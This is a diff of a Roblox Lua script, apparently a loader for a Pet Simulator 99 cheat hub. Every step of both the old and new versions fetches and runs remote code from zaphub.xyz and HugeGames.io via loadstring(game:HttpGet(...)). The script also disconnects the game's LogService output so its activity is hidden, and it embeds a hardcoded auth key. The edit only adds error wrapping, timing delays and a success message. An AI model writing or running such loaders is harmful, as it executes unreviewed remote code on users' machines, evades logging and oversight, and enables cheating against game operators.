@@ -1,13 +1,24 @@
-loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
+pcall(function()
+    loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
+end)
 
-wait(4)
-for i,v in pairs(getconnections(game.LogService.MessageOut)) do
-    v:Disconnect()
-end
-wait(4)
-getgenv().AuthKey = "HUGE_yr9lEktNGFjD"
-getgenv().LoadSettings = {
-    ToggleBind = Enum.KeyCode.RightBracket,
-}
-loadstring(game:HttpGet("https://HugeGames.io/ps99"))()
-print(HIIII)
+task.delay(4, function()
+    for i, v in pairs(getconnections(game.LogService.MessageOut)) do
+        pcall(function()
+            v:Disconnect()
+        end)
+    end
+end)
+
+task.delay(8, function()
+    getgenv().AuthKey = "HUGE_yr9lEktNGFjD"
+    getgenv().LoadSettings = {
+        ToggleBind = Enum.KeyCode.RightBracket,
+    }
+    
+    pcall(function()
+        loadstring(game:HttpGet("https://HugeGames.io/ps99"))()
+    end)
+
+    print("✅ Todos os scripts foram executados com sucesso.")
+end)
